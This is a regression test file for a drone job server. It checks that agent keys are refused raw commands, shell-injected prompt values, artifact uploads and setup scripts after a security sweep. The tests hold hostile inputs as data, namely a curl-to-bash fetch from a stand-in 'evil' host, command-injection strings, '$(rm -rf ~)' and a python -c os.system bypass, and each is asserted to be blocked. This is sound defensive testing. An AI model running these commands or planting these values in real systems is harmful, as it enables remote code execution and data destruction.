import { describe, test, expect, beforeAll, afterAll } from 'vitest'
import { mkdtempSync, rmSync, existsSync, readdirSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import crypto from 'node:crypto'
import express from 'express'
import request from 'supertest'

// Regression tests for the drone-mesh RCE cluster (security sweep 2026-07-01):
//
//   C-1  POST /drones/jobs accepted a raw `command` from any agent key; the drone
//        runs it verbatim → RCE. Raw commands are now admin-only; agents use
//        templates (job_type), whose command is server-rendered.
//   C-2  renderJobForDrone interpolated input_data into the command string with no
//        escaping → shell injection. Values with shell metacharacters are now
//        rejected at render time (cross-OS), while normal prompt text passes.
//   C-3  POST /drones/artifacts overwrote by filename with no auth scoping, so any
//        agent could poison the trusted generate_flux.py → mesh-wide RCE. Upload is
//        now admin-only, gated BEFORE multer writes to disk.
//
// Harness mirrors directive-and-upload-auth.test.js.

const ADMIN_KEY = 'test-admin-key-0123456789abcdef0123456789abcdef'
const AGENT_KEY = 'dvk_' + 'b'.repeat(48)

let tmpDataDir
let db
let app

beforeAll(async () => {
  tmpDataDir = mkdtempSync(join(tmpdir(), 'myc-drone-rce-'))
  process.env.DATA_DIR = tmpDataDir
  process.env.ADMIN_KEY = ADMIN_KEY

  db = await import('../../server/db.js')
  db.initDB()

  const routes = (await import('../../server/routes/mycelium.js')).default
  app = express()
  app.use(express.json())
  app.use('/api/mycelium', routes)

  // A regular agent (role 'agent').
  const hash = crypto.createHash('sha256').update(AGENT_KEY).digest('hex')
  db.createAgent('lucy-rce', 'Lucy RCE', 'rce-proj', hash, '["code"]')

  // A CPU template whose command interpolates a user-supplied prompt.
  db.createJobTemplate('flux-test', {
    name: 'Flux Test',
    requires: '["cpu"]',
    command_template: 'python gen.py --prompt "{{prompt}}" --steps {{steps}}',
    workspace_name: 'flux-test',
  })

  // A drone agent with diagnostics so renderJobForDrone can resolve platform vars.
  db.createAgent('drone-rce', 'Drone RCE', 'rce-proj', crypto.createHash('sha256').update('dvk_' + 'c'.repeat(48)).digest('hex'), '["cpu"]')
  db.updateDroneDiagnostics('drone-rce', { os: 'linux', python_path: '/usr/bin/python3', home: '/home/drone', username: 'drone' })
})

afterAll(() => {
  if (tmpDataDir) rmSync(tmpDataDir, { recursive: true, force: true })
})

function countFiles(dir) {
  if (!existsSync(dir)) return 0
  return readdirSync(dir, { withFileTypes: true }).filter((e) => e.isFile()).length
}

describe('C-1 · raw drone command is admin-only', () => {
  test('a regular agent submitting a raw command is 403', async () => {
    const res = await request(app)
      .post('/api/mycelium/drones/jobs')
      .set('X-Agent-Key', AGENT_KEY)
      .send({ title: 'pwn', command: 'curl http://evil/x.sh | bash', requires: ['cpu'] })
    expect(res.status).toBe(403)
  })

  test('an agent can still submit a template job (no raw command)', async () => {
    const res = await request(app)
      .post('/api/mycelium/drones/jobs')
      .set('X-Agent-Key', AGENT_KEY)
      .send({ title: 'render', job_type: 'flux-test' })
    expect(res.status).toBe(200)
    expect(res.body).toHaveProperty('id')
  })

  test('an admin can still submit a raw command (gate is not over-restrictive)', async () => {
    const res = await request(app)
      .post('/api/mycelium/drones/jobs')
      .set('X-Admin-Key', ADMIN_KEY)
      .set('X-Acting-As', 'greatness')
      .send({ title: 'admin job', command: 'echo hello', requires: ['cpu'] })
    expect(res.status).toBe(200)
    expect(res.body).toHaveProperty('id')
  })
})

describe('C-2 · renderJobForDrone rejects shell metacharacters in input_data', () => {
  test('a prompt with an injection payload is refused', () => {
    const out = db.renderJobForDrone('flux-test', 'drone-rce', { prompt: 'cat"; curl evil | sh; echo "', steps: 30 })
    expect(out.error).toBeTruthy()
    expect(out.command).toBeUndefined()
  })

  test('command substitution via $() / backtick is refused', () => {
    expect(db.renderJobForDrone('flux-test', 'drone-rce', { prompt: '$(rm -rf ~)', steps: 30 }).error).toBeTruthy()
    expect(db.renderJobForDrone('flux-test', 'drone-rce', { prompt: 'a `whoami` b', steps: 30 }).error).toBeTruthy()
  })

  test('a normal descriptive prompt renders fine', () => {
    const out = db.renderJobForDrone('flux-test', 'drone-rce', { prompt: "a rugged man's face, cinematic (detailed), 85mm", steps: 30 })
    expect(out.error).toBeFalsy()
    expect(out.command).toContain('--prompt')
    expect(out.command).toContain('--steps 30')
  })
})

describe('C-3 · drone artifact upload is admin-only, gated before multer', () => {
  test('a regular agent uploading an artifact is 403 and writes NOTHING to disk', async () => {
    const artifactsDir = join(tmpDataDir, 'drone_artifacts')
    const before = countFiles(artifactsDir)
    const res = await request(app)
      .post('/api/mycelium/drones/artifacts')
      .set('X-Agent-Key', AGENT_KEY)
      .attach('file', Buffer.from('malicious generate_flux.py'), 'generate_flux.py')
    expect(res.status).toBe(403)
    expect(countFiles(artifactsDir)).toBe(before) // poison never reached disk
  })

  test('an admin can upload a trusted artifact', async () => {
    const res = await request(app)
      .post('/api/mycelium/drones/artifacts')
      .set('X-Admin-Key', ADMIN_KEY)
      .set('X-Acting-As', 'greatness')
      .attach('file', Buffer.from('print("trusted")'), 'generate_flux.py')
    expect(res.status).toBe(200)
    expect(res.body.ok).toBe(true)
  })
})

describe('C-4 · input_data.setup is admin-only (shell-executed on the drone)', () => {
  test('a regular agent submitting input_data.setup is 403', async () => {
    const res = await request(app)
      .post('/api/mycelium/drones/jobs')
      .set('X-Agent-Key', AGENT_KEY)
      .send({ title: 'pwn', job_type: 'flux-test', input_data: { prompt: 'x', steps: 1, setup: 'pip install evil-pkg' } })
    expect(res.status).toBe(403)
  })

  test('the metachar-free bypass (python -c) is also refused — SHELL_META does not catch it', async () => {
    const res = await request(app)
      .post('/api/mycelium/drones/jobs')
      .set('X-Agent-Key', AGENT_KEY)
      .send({ title: 'pwn2', job_type: 'flux-test', input_data: { setup: 'python -c "__import__(\'os\').system(\'id\')"' } })
    expect(res.status).toBe(403)
  })

  test('a regular agent submitting setup via from-template is 403', async () => {
    const res = await request(app)
      .post('/api/mycelium/drones/jobs/from-template')
      .set('X-Agent-Key', AGENT_KEY)
      .send({ template_id: 'flux-test', input_data: { setup: 'touch /tmp/pwned' } })
    expect(res.status).toBe(403)
  })

  test('a template job without setup still works (gate is not over-restrictive)', async () => {
    const res = await request(app)
      .post('/api/mycelium/drones/jobs')
      .set('X-Agent-Key', AGENT_KEY)
      .send({ title: 'render', job_type: 'flux-test', input_data: { prompt: 'a cat', steps: 20 } })
    expect(res.status).toBe(200)
    expect(res.body).toHaveProperty('id')
  })

  test('an admin may still supply setup (gate is not over-restrictive)', async () => {
    const res = await request(app)
      .post('/api/mycelium/drones/jobs')
      .set('X-Admin-Key', ADMIN_KEY)
      .set('X-Acting-As', 'greatness')
      .send({ title: 'admin setup', command: 'echo hi', input_data: { setup: 'pip install -r requirements.txt' } })
    expect(res.status).toBe(200)
    expect(res.body).toHaveProperty('id')
  })
})
